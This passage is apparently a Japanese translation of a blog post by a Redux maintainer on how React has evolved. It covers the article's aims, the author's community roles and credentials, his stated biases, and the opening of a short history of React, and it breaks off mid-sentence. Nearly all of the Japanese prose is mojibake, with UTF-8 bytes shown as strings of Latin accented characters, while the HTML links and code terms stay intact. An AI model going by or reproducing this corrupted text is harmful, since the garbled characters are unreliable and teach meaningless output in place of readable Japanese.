ã“ã‚Œã‚‰ã®ãƒˆãƒ”ãƒƒã‚¯ã®ã»ã‚“ã®ä¸€éƒ¨ã‚’ã‚«ãƒãƒ¼ã—ã‚ˆã†ã¨ã™ã‚‹ã ã‘ã§ã‚‚ã€åºƒç¯„ã§è©³ç´°ãªè¨˜äº‹ãŒå¿…è¦ã¨ãªã‚Šã¾ã™ï¼ˆãã—ã¦ç§ã¯ã€ã€ŒReactã¯æ‚ªã„ã®ã‹/Reactã¯ä»–ã®ãƒ„ãƒ¼ãƒ«ã¨æ¯”ã¹ã¦ã©ã†ãªã®ã‹ï¼Ÿã€ã¨ã„ã†ã€ã•ã‚‰ã«ã‚¹ã‚³ãƒ¼ãƒ—å¤–ã®ãƒˆãƒ”ãƒƒã‚¯ã«ã¯è§¦ã‚Œã‚‹ã¤ã‚‚ã‚Šã™ã‚‰ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚ã—ã‹ã—ã€ã‚ã¾ã‚Šã«ã‚‚å¤šãã®æ™‚é–“ã‚’è¨è«–ã¨èª¬æ˜ã«è²»ã‚„ã—ã¦ããŸä»Šã€ã“ã‚Œã‚‰ã®ãƒˆãƒ”ãƒƒã‚¯ã®å¤šãã‚’ã¾ã¨ã‚ã¦æ‰±ã†çµ±åˆçš„ãªè¨˜äº‹ã‚’æ›¸ãå¿…è¦æ€§ã‚’æ„Ÿã˜ã¦ã„ã¾ã™ã€‚
ã¾ãŸã€ç§ã¯éå»ã«<a href="https://blog.isquaredsoftware.com/2025/06/presentations-react-community-2025/">ã“ã®è¨˜äº‹ã®ãƒˆãƒ”ãƒƒã‚¯ã«åŸºã¥ã„ãŸè¬›æ¼”</a>ã‚‚è¡Œã£ã¦ã„ã¾ã™ã€‚</p>
<h2>ã“ã®è¨˜äº‹ã®ç›®çš„</h2>
<p>ã“ã®è¨˜äº‹ã«ãŠã‘ã‚‹ç§ã®ç›®çš„ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚</p>
<ul>
<li>ReactãŒæ™‚é–“ã¨å…±ã«ã©ã®ã‚ˆã†ã«ç™ºå±•ã—ã¦ããŸã‹ã®æ¦‚è¦ã‚’èª¬æ˜ã™ã‚‹</li>
<li>Reactã®é–‹ç™ºã‚’æ¨é€²ã™ã‚‹åŠ›ã‚’èª¬æ˜ã™ã‚‹</li>
<li>Reactã®æœ€è¿‘ã®é–‹ç™ºã®æ–¹å‘æ€§ãŒãªãœã€ã©ã®ã‚ˆã†ã«ã—ã¦èµ·ã“ã£ãŸã®ã‹ã‚’æ˜ç¢ºã«ã—ã€ãã®ä½œæ¥­ã®èƒŒæ™¯ã«ã‚ã‚‹ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ä¸Šã®æ±ºå®šã®ã„ãã¤ã‹ã‚’èª¬æ˜ã™ã‚‹</li>
<li>Reactã®é–‹ç™ºã®èƒŒå¾Œã«ã‚ã‚‹å‹•æ©Ÿã¨æ„å›³ã«é–¢ã™ã‚‹FUDã¨æ··ä¹±ã‚’æ˜ç¢ºã«ã—ã€æ‰•æ‹­ã™ã‚‹</li>
</ul>
<h2>èƒŒæ™¯ï¼šç§ã®Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«ãŠã‘ã‚‹å½¹å‰²ã¨é–¢ä¸</h2>
<p>ï¼ˆã‚‚ã—ãã¯ã€Œç§ã¯ä½•è€…ã§ã€ãªãœç§ã®èª¬æ˜ã‚’ä¿¡é ¼ã™ã¹ãã§ã€ãã—ã¦ãªãœã‚ãªãŸã¯ã“ã®ä»¶ã«é–¢ã™ã‚‹ç§ã®æ„è¦‹ã‚’æ°—ã«ã‹ã‘ã‚‹ã¹ããªã®ã‹ï¼Ÿ ğŸ˜„ã€ï¼‰</p>
<p>ç§ã¯å®Ÿéš›ã®Reactãƒãƒ¼ãƒ ã®ä¸€å“¡ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã—ã€ã“ã‚Œã¾ã§ã‚‚ãã†ã§ã‚ã£ãŸã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã¨ã¯ã„ãˆã€ç§ã¯2015å¹´ã‹ã‚‰Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«æ·±ãé–¢ã‚ã£ã¦ãŠã‚Šã€Metaã‚„Vercelã®å¤–éƒ¨ã®äººé–“ã¨ã—ã¦ã¯ã€èª°ã‚ˆã‚Šã‚‚ã€ŒReactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ã‚¤ãƒ³ãƒŠãƒ¼ã‚µãƒ¼ã‚¯ãƒ«ã€ã®ä¸€å“¡ã§ã‚ã‚‹ã¨è¨€ã£ã¦å·®ã—æ”¯ãˆãªã„ã§ã—ã‚‡ã†ã€‚</p>
<p>è¦ç´„ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®é€šã‚Šã§ã™ã€‚</p>
<ul>
<li>2015å¹´ã‹ã‚‰Reactã‚’ä½¿ç”¨</li>
<li>Reduxãƒ©ã‚¤ãƒ–ãƒ©ãƒªãƒ•ã‚¡ãƒŸãƒªãƒ¼ã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ã§ã‚ã‚Šã€Reactã«ã‚³ãƒ³ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ãƒˆã—ã€Reactã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®è­°è«–ã«é–¢ä¸</li>
<li>Reactã¨Reduxã«é–¢ã™ã‚‹å¤šæ•°ã®è©³ç´°ãªãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’åŸ·ç­†ã—ã€Reactã¨Reduxã«ã¤ã„ã¦é »ç¹ã«è¬›æ¼”</li>
<li>ãã®ã»ã¨ã‚“ã©ã®æœŸé–“ã€ä¸»è¦ãªReactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ¢ãƒ‡ãƒ¬ãƒ¼ã‚¿ãƒ¼ã¨ã—ã¦é–¢ä¸</li>
</ul>
<p>ã‚‚ã—è©³ç´°ã‚’çŸ¥ã‚ŠãŸã‘ã‚Œã°ï¼š</p>
<details>
<summary>ç§ã®å®Ÿç¸¾ã€é–¢ä¸ã€çµŒæ­´</summary>
<p>ç§ã¯2015å¹´åŠã°ã«Reactã‚’å­¦ã³å§‹ã‚ã¾ã—ãŸã€‚ãã‚Œä»¥å‰ã¯ã€Backboneã€jQueryã€GWTã‚’ä½¿ã£ã¦åœ°ç†ç©ºé–“æƒ…å ±ã®å¯è¦–åŒ–ã‚¢ãƒ—ãƒªã‚’ã„ãã¤ã‹æ§‹ç¯‰ã—ã¦ã„ã¾ã—ãŸã€‚ãã‚Œã‹ã‚‰1å¹´ã®é–“ã«ã€ç§ã¯<a href="https://blog.isquaredsoftware.com/2016/09/how-i-got-here-my-journey-into-the-world-of-redux-and-open-source/">ã„ãã¤ã‹ã®Reactãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€ã¨ã“ã‚ã‹ã‚‰ã€Reactifluxã®ãƒãƒ£ãƒƒãƒˆãƒãƒ£ãƒ³ãƒãƒ«ã‚’çœºã‚ã¦ã„ã‚‹ã†ã¡ã«ã€éå¸¸ã«å¤šãã®è³ªå•ã«ç­”ãˆã‚‹ã‚ˆã†ã«ãªã£ã¦ãƒ¢ãƒ‡ãƒ¬ãƒ¼ã‚¿ãƒ¼ã«ãªã‚Šã€Reduxã®FAQã‚’è‡ªã‚‰åŸ·ç­†ã—ã€ãã—ã¦æ–°ã—ã„Reduxã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ã¨ã—ã¦ãã®å½¹å‰²ã‚’å¼•ãç¶™ãã“ã¨ã«ãªã‚Šã¾ã—ãŸ</a>ã€‚</p>
<p>ç§ã¯2016å¹´åŠã°ã‹ã‚‰Reduxã‚’ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã—ã¦ã„ã¾ã™ã€‚ç¾ä»£çš„ãªReduxã‚¢ãƒ—ãƒªã®è¨˜è¿°æ–¹æ³•ã¨ã—ã¦<a href="https://blog.isquaredsoftware.com/2019/10/redux-toolkit-1.0/">Redux Toolkitã‚’ä½œæˆ</a>ã—ã¾ã—ãŸã€‚Reduxã«å–ã‚Šçµ„ã‚€ä¸­ã§ã€v5ä»¥é™ã®React-Reduxã®å…¨ã¦ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’è¨­è¨ˆã—ã€ãƒªãƒªãƒ¼ã‚¹ã—ã¦ãã¾ã—ãŸã€‚ReactãŒå¤–éƒ¨ã®çŠ¶æ…‹ç®¡ç†ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¨ã©ã®ã‚ˆã†ã«é€£æºã™ã¹ãã‹ã«ã¤ã„ã¦Reactãƒãƒ¼ãƒ ã¨ä½•åº¦ã‚‚è©±ã—åˆã„ã€<a href="https://github.com/reduxjs/react-redux/pull/1808">useSyncExternalStoreãƒ•ãƒƒã‚¯ã®é–‹ç™ºã«ãŠã„ã¦ã¯ã€ç§ãŒå”¯ä¸€ã®ã‚¢ãƒ«ãƒ•ã‚¡ãƒ†ã‚¹ã‚¿ãƒ¼ã§ã—ãŸ</a>ã€‚</p>
<p>ç§ã¯ã€<a href="https://redux.js.org/tutorials/essentials/part-1-overview-concepts">ã€ŒRedux Essentialsã€ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«</a>ã‚„ã€åºƒãç§°è³›ã•ã‚Œã¦ã„ã‚‹<a href="https://blog.isquaredsoftware.com/2020/05/blogged-answers-a-mostly-complete-guide-to-react-rendering-behavior/">ã€ŒReactã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ãƒ“ãƒ˜ã‚¤ãƒ“ã‚¢ã¸ã®ã‚¬ã‚¤ãƒ‰ã€ã®è¨˜äº‹</a>ï¼ˆã“ã®è¨˜äº‹ã¯ã€ReactãŒå®Ÿéš›ã«ã©ã®ã‚ˆã†ã«å‹•ä½œã™ã‚‹ã‹ã®æœ€è‰¯ã®èª¬æ˜ã¨ã—ã¦ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§å¸¸ã«æ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ï¼‰ã‚’ã¯ã˜ã‚ã€äººã€…ãŒReactã¨Reduxã‚’ã©ã®ã‚ˆã†ã«ä½¿ã„ã€ãã‚Œã‚‰ãŒã©ã®ã‚ˆã†ã«å‹•ä½œã™ã‚‹ã‹ã‚’æ•™ãˆã‚‹ãŸã‚ã«ã€ä½•åä¸‡èªã‚‚ã®ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚„ãƒ–ãƒ­ã‚°è¨˜äº‹ã‚’åŸ·ç­†ã—ã¦ãã¾ã—ãŸã€‚ç§ã¯ã€Githubã€Reactiflux Discordã€Redditã€Twitterã€Hacker Newsã€Stack Overflowã«ã‚ãŸã£ã¦ã€Reactã€Reduxã€JSã®ã‚ã‚‰ã‚†ã‚‹ã“ã¨ã«ã¤ã„ã¦ã€ä½•åƒã‚‚ã®ã‚³ãƒ¡ãƒ³ãƒˆã‚„è³ªå•ã«å›ç­”ã—ã¦ãã¾ã—ãŸã€‚<a href="https://blog.isquaredsoftware.com/2025/06/react-community-2025/#:~:text=%22the%20tech%20support%20for%20the%20React%20community%22%20and%20%22the%20master%20archiver%20and%20indexer%20of%20all%20things%20React%22">ã€ŒReactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ãƒ†ã‚¯ãƒ‹ã‚«ãƒ«ã‚µãƒãƒ¼ãƒˆã€ã€ãã—ã¦ã€ŒReactã«é–¢ã™ã‚‹å…¨ã¦ã®äº‹æŸ„ã®ãƒã‚¹ã‚¿ãƒ¼ã‚¢ãƒ¼ã‚«ã‚¤ãƒãƒ¼å…¼ã‚¤ãƒ³ãƒ‡ã‚¯ã‚µãƒ¼ã€</a>ã¨å‘¼ã°ã‚Œã¦ãã¾ã—ãŸã€‚</p>
<p>ç§ã¯<a href="https://blog.isquaredsoftware.com/presentations">æ•°å¤šãã®Reacté–¢é€£ã‚«ãƒ³ãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹</a>ã§ã€<a href="https://blog.isquaredsoftware.com/2023/08/presentations-react-rendering-behavior/">Reactã®ä»•çµ„ã¿</a>ã‹ã‚‰<a href="https://blog.isquaredsoftware.com/2024/11/presentations-maintaining-community/">åºƒãä½¿ã‚ã‚Œã¦ã„ã‚‹OSSãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã™ã‚‹ä¸Šã§ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹</a>ã‚„æ•™è¨“ã«è‡³ã‚‹ã¾ã§ã€<a href="https://blog.isquaredsoftware.com/presentations/">ã•ã¾ã–ã¾ãªãƒˆãƒ”ãƒƒã‚¯ã«ã¤ã„ã¦ç™»å£‡</a>ã—ã¦ãã¾ã—ãŸã€‚<a href="https://www.reactiflux.com/transcripts/tmir-2024-12">Reactiflux DiscordãŒä¸»å‚¬ã™ã‚‹ç¾åœ¨ã‚‚ç¶šããƒãƒƒãƒ‰ã‚­ãƒ£ã‚¹ãƒˆã€This Month in Reactã€</a>ï¼ˆã“ã®ãƒãƒƒãƒ‰ã‚­ãƒ£ã‚¹ãƒˆã§ã¯ã€Reactã¨ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«é–¢ã™ã‚‹æœ€æ–°ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã€ãƒªãƒªãƒ¼ã‚¹ã€çŸ¥è¦‹ã«ã¤ã„ã¦è©±ã—ã¦ã„ã¾ã™ï¼‰ã‚’ã¯ã˜ã‚ã€æ•°å¤šãã®ãƒãƒƒãƒ‰ã‚­ãƒ£ã‚¹ãƒˆã§Reactã¨Reduxã«ã¤ã„ã¦è­°è«–ã—ã¦ãã¾ã—ãŸã€‚</p>
<p>ç§ã¯ã€React Hooksã®åˆæœŸãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ã®ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã‚„ã€æ‹›å¾…åˆ¶ã§ã‚ã‚ŠãªãŒã‚‰å…¬é–‹ã•ã‚Œã¦ã„ãŸReact 18ãƒ¯ãƒ¼ã‚­ãƒ³ã‚°ã‚°ãƒ«ãƒ¼ãƒ—ã®ä¸€å“¡ã§ã‚ã‚Šã€ä¸¡æ–¹ã®ãƒªãƒªãƒ¼ã‚¹ã«ã¤ã„ã¦ã€è¨­è¨ˆã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã€åˆ©ç”¨æ–¹æ³•ã®å´é¢ã§ãƒ•ã‚£ãƒ¼ãƒ‰ãƒãƒƒã‚¯ã‚’æä¾›ã—ã¾ã—ãŸã€‚</p>
<p>ç§ã¯<a href="https://www.reactiflux.com/">Reactiflux Discordã®ç®¡ç†è€…</a>ã§ã‚ã‚Šã€æ•°å¹´é–“ã«ã‚ãŸã‚Š<a href="https://reddit.com/r/reactjs/">the/r/reactjs subreddit</a>ã®ä¸»è¦ãªç¾å½¹ãƒ¢ãƒ‡ãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’å‹™ã‚ã¦ã„ã¾ã™ã€‚</p>
<p>ç§ã¯ã€Reactã®ãƒªãƒã‚¸ãƒˆãƒªã‚„å†…éƒ¨ã®ã‚³ãƒ¼ãƒ‰ã‚’æ·±ãæ˜ã‚Šä¸‹ã’ã¦ãã¾ã—ãŸã€‚ä¾‹ãˆã°ã€<a href="https://github.com/facebook/react/pull/26446">Reactã®ãƒ—ãƒ­ãƒ€ã‚¯ã‚·ãƒ§ãƒ³ãƒ“ãƒ«ãƒ‰ç”¨ã®ã‚½ãƒ¼ã‚¹ãƒãƒƒãƒ—ã‚’ç”Ÿæˆã™ã‚‹PR</a>ã‚’æå‡ºã—ãŸã‚Šã€<a href="https://blog.isquaredsoftware.com/2023/10/presentations-react-devtools-replay/">ã‚¿ã‚¤ãƒ ãƒˆãƒ©ãƒ™ãƒ«ãƒ‡ãƒãƒƒã‚°ã‚’ç”¨ã„ã¦React DevToolsã‚’Replayã®DevToolsã«çµ±åˆ</a>ã—ãŸã‚Šã—ã¾ã—ãŸã€‚</p>
</details>
<p>ã“ã‚Œã‚‰ã®å®Ÿç¸¾ã‚’æŒ™ã’ãŸã®ã¯ã€ç§ãŒReactã®é–‹ç™ºæ–¹æ³•ã€Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã§ä½•ãŒèµ·ã“ã£ã¦ã„ã‚‹ã‹ã€Reactãƒãƒ¼ãƒ ã®å†…éƒ¨ã§ä½•ãŒèµ·ã“ã£ã¦ã„ã‚‹ã‹ã€ãã—ã¦äººã€…ãŒReactã¨Reduxã‚’å­¦ã¶ã®ã‚’åŠ©ã‘ã‚‹ã“ã¨ã«é–¢ã—ã¦ã€é•·ã„æ­´å²ã¨å°‚é–€çŸ¥è­˜ã‚’æŒã£ã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã™ãŸã‚ã§ã™ã€‚</p>
<h2>ãƒã‚¤ã‚¢ã‚¹ã¨æ³¨æ„ç‚¹</h2>
<p>ã“ã“ã¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãªã®ã§ã€ç§ãŒã“ã‚Œã‚’æ›¸ãã“ã¨ã«å¯¾ã—ã¦çš†ã•ã‚“ãŒæŠ±ãã‹ã‚‚ã—ã‚Œãªã„ã„ãã¤ã‹ã®æ‡¸å¿µã‚’å…ˆå–ã‚Šã—ã¦ãŠã“ã†ã¨æ€ã„ã¾ã™ã€‚</p>
<p>ç§ã¯é–“é•ã„ãªãå¸¸ã«æ­£ã—ã„ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã—ã€çŸ¥è­˜ã®é™ç•Œã€èª¤è§£ã€ã‚ã‚‹ã„ã¯è¦ç´„ã®ã—ã™ãã«ã‚ˆã£ã¦ã€ã„ãã¤ã‹ã®äº‹æŸ„ã‚’èª¤ã£ã¦èª¬æ˜ã—ã¦ã—ã¾ã†ã“ã¨ã¯é–“é•ã„ã‚ã‚Šã¾ã›ã‚“ã€‚ã¨ã¯ã„ãˆã€ç§ã¯æ­´å²ã€å‹•æ©Ÿã€è¡Œå‹•ã‚’ã§ãã‚‹é™ã‚Šæ­£ç›´ã‹ã¤æ­£ç¢ºã«è¨˜è¿°ã™ã‚‹ãŸã‚ã®æœ€å–„ã®åŠªåŠ›ã¨ã—ã¦ã“ã‚Œã‚’æ›¸ã„ã¦ã„ã¾ã™ã€‚</p>
<p>ã•ã‚‰ã«è©³ã—ãã¯ï¼š</p>
<details>
<summary>ã‚ˆã‚Šè©³ç´°ãªãƒã‚¤ã‚¢ã‚¹ã¨æ³¨æ„ç‚¹</summary>
<p>ç§ãŒReduxã®ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ã§ã‚ã‚‹ã“ã¨ã¯ã€Reactã®ä½¿ã‚ã‚Œæ–¹ã‚„ã€ç§ãŒæ™®æ®µæ‰±ã†å•é¡Œã®ç¨®é¡ã«å¯¾ã™ã‚‹ç§è‡ªèº«ã®è¦‹æ–¹ã«ã€åã‚Šã‚’ã‚‚ãŸã‚‰ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ç§ã¯2015å¹´ã‹ã‚‰ä¸€è²«ã—ã¦ä½•ã‚‰ã‹ã®å½¢ã§Reactã‚’ä½¿ã„ç¶šã‘ã¦ãã¾ã—ãŸãŒã€ç§è‡ªèº«ã®Reactã‚’ä½¿ã£ãŸçµŒé¨“ã¯ã€æ™‚é–“ã¨å…±ã«ã‚ˆã‚Šé™å®šçš„ã§ãƒ‹ãƒƒãƒãªã‚‚ã®ã«ãªã£ã¦ãã¾ã—ãŸã€‚ç§ãŒæºã‚ã£ãŸReactã‚¢ãƒ—ãƒªã®ã»ã¨ã‚“ã©ã¯ã€é…å¸ƒå…ˆãŒé™å®šã•ã‚ŒãŸç¤¾å†…ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€ãã®å¤§åŠã¯ã€Œãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã®ãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—é¢¨ã‚¢ãƒ—ãƒªã€ã€ã¤ã¾ã‚Šãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚„CRUDã®ã‚ˆã†ãªæŒ™å‹•ã™ã‚‰ãªã„ã€çœŸã®SPAã§ã—ãŸã€‚CRUD/ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰å½¢å¼ã®ã‚¢ãƒ—ãƒªã«1ã¤æºã‚ã£ãŸã“ã¨ã¯ã‚ã‚Šã¾ã™ãŒã€ãã®ç¯„å›²ã¯é™å®šçš„ã§ã—ãŸã€‚å·¨å¤§ãªã‚ªãƒ¼ãƒ‡ã‚£ã‚¨ãƒ³ã‚¹ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚’æ§‹ç¯‰ã—ãŸã“ã¨ã¯ãªãã€SSRã‚„RSCã‚’å®Ÿéš›ã«ä½¿ã£ãŸã“ã¨ã‚‚ãªãã€å›½éš›åŒ–ï¼ˆi18nï¼‰ã‚„ãã®ä»–ã®å¤§è¦æ¨¡ãªã‚¹ã‚±ãƒ¼ãƒªãƒ³ã‚°ã«é–¢ã™ã‚‹æ‡¸å¿µã«é ­ã‚’æ‚©ã¾ã›ã‚‹å¿…è¦ã‚‚ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚ç§ã¯æ™‚é–“ã®å¤šãã‚’ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚„é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã®ä½œæ¥­ã«è²»ã‚„ã—ã¦ãŠã‚Šã€ã€Œå…¸å‹çš„ãªã€Reactã‚¢ãƒ—ãƒªã®æ—¥ã€…ã®é–‹ç™ºã«è²»ã‚„ã™æ™‚é–“ã¯ã¯ã‚‹ã‹ã«å°‘ãªã„ã®ã§ã™ã€‚</p>
<p>ç§ã¯ã€å¹³å‡çš„ãªReactã‚¢ãƒ—ãƒªé–‹ç™ºè€…ãŒæ±ºã—ã¦è€³ã«ã—ãŸã‚Šæ°—ã«ã—ãŸã‚Šã™ã‚‹ã“ã¨ã®ãªã„ã€Reactã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®å°‚é–€çš„ã§å†…è¼ªãªè­°è«–ã‚’èª­ã‚“ã ã‚Šã€å‚åŠ ã—ãŸã‚Šã—ã¦ãã¾ã—ãŸã€‚</p>
<p>ç§ã¯Reactãƒãƒ¼ãƒ ã¨ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ãŠã‚ˆã³å¯¾é¢ã§å€‹äººçš„ãªã‚„ã‚Šå–ã‚Šã‚’ã—ã¦ãã¾ã—ãŸãŒã€ãã‚Œã‚‰ã¯éå¸¸ã«ãƒã‚¸ãƒ†ã‚£ãƒ–ãªã‚‚ã®ã‚‚ã‚ã‚Œã°ã€éå¸¸ã«ãƒã‚¬ãƒ†ã‚£ãƒ–ã§ä¸æº€ã®ãŸã¾ã‚‹ã‚‚ã®ã‚‚ã‚ã‚Šã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã¯ç§è‡ªèº«ã®è¦–ç‚¹ã‚’è‰²ã¥ã‘ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã®ä»–ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã‚‚ååˆ†ã«è­°è«–ã‚’é‡ã­ã¦ããŸã®ã§ã€ä»–ã®å¤šãã®äººã€…ã‚‚ç§ã®æ‡¸å¿µã‚„æ„è¦‹ã‚’å…±æœ‰ã—ã¦ã„ã‚‹ã¨ç¢ºä¿¡ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ç§ã®é€šå¸¸ã®åŸ·ç­†ã‚¹ã‚¿ã‚¤ãƒ«ã¯ã€ã§ãã‚‹ã ã‘å¤šãã®å‚ç…§ã‚„æƒ…å ±æºã¸ãƒªãƒ³ã‚¯ã‚’å¼µã‚‹ã“ã¨ã§ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ãã‚Œã‚’è©¦ã¿ã¾ã™ãŒã€ã“ã‚Œã‚‰ã®æ­´å²çš„ãªè¨˜è¿°ã‚„è¦‹è§£ã®å¤šãã¯ã€ç‰¹å®šã®æƒ…å ±æºã‚’è¦‹ã¤ã‘ã‚‹ã®ãŒé›£ã—ã„ã§ã—ã‚‡ã†ã€‚ã§ã™ã‹ã‚‰ã€è¦ç´„ã•ã‚Œã¦ã„ã‚‹ã¨ã—ã¦ã‚‚ã€ç§ãŒãã‚Œã‚‰ã‚’æ­£ç¢ºã«è¨˜è¿°ã™ã‚‹ãŸã‚ã«æœ€å–„ã‚’å°½ãã—ã¦ã„ã‚‹ã“ã¨ã‚’ä¿¡ã˜ã¦ãã ã•ã„ã€‚</p>
</details>
<p>ã•ã¦ã€ã“ã‚Œã‚‰ã®æ³¨æ„ç‚¹ã‚’å…¨ã¦è¿°ã¹ãŸã¨ã“ã‚ã§ã€æœ¬é¡Œã«å…¥ã‚Šã¾ã—ã‚‡ã†ã€‚</p>
<h2>Reactã®ç°¡å˜ãªæ­´å²</h2>
<p>åˆæœŸã®æ­´å²ã¯ã€<a href="https://www.youtube.com/watch?v=8pDqJVdNa44">Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ã‚¿ãƒªãƒ¼</a>ãªã©ä»–ã®å ´æ‰€ã§ã‚ˆã‚Šè©³ã—ãèªã‚‰ã‚Œã¦ã„ã¾ã™ãŒã€ã“ã®è¨˜äº‹ã®æ®‹ã‚Šã®éƒ¨åˆ†ã®æ–‡è„ˆã‚’æä¾›ã™ã‚‹ãŸã‚ã«å°‘ã—è§¦ã‚Œã¦ãŠãã¾ã™ã€‚</p>
<p>Reactã¯2011å¹´ã‹ã‚‰12å¹´é ƒã«Facebookå†…éƒ¨ã§é–‹ç™ºã•ã‚Œã€2013å¹´ã«ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹åŒ–ã•ã‚Œã¾ã—ãŸã€‚å¤–éƒ¨ã®ã‚³ãƒ³ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚‚å°‘æ•°é›†ã¾ã‚Šã¾ã—ãŸãŒã€æœ€è¿‘ã¾ã§å®Ÿéš›ã®é–‹ç™ºã¯å…¨ã¦Facebook/Metaå†…éƒ¨ã®Reactã‚³ã‚¢ãƒãƒ¼ãƒ ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã¦ã„ã¾ã—ãŸã€‚</p>
<p>Reactã®æ ¸ã¨ãªã‚‹ã‚³ãƒ³ã‚»ãƒ—ãƒˆï¼ˆã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã€propsã€stateã€ãƒ‡ãƒ¼ã‚¿ãƒ•ãƒ­ãƒ¼ï¼‰ã¯å¸¸ã«åŒã˜ã§ã™ãŒã€å®Ÿè£…ã®è©³ç´°ã€å…¬é–‹APIã€ã‚¹ã‚³ãƒ¼ãƒ—ã®åºƒã•ã¯æ™‚é–“ã¨å…±ã«å¤‰åŒ–ã—ã¦ãã¾ã—ãŸã€‚Reactã¯<code class="language-text">createClass</code>ã§ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹æ–¹å¼ã‹ã‚‰ã€ES6ã®<code class="language-text">class MyComponent extends React.Component</code>ã¸ã€ãã—ã¦<code class="language-text">function MyComponent()</code>ã¸ã¨ç§»è¡Œã—ã¾ã—ãŸã€‚Reactã¯Webå°‚ç”¨ã‹ã‚‰React Nativeã§ãƒ¢ãƒã‚¤ãƒ«ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚ˆã†ã«åˆ†é›¢ã—ã€ãã®å¾Œã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºå¯èƒ½ãª<code class="language-text">react-reconciler</code>ã‚³ã‚¢ã‚’ä»‹ã—ã¦WebGLï¼ˆ<code class="language-text">react-three-fiber</code>ï¼‰ã‚„CLIï¼ˆ<code class="language-text">ink</code>ï¼‰ãªã©ä»–ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ 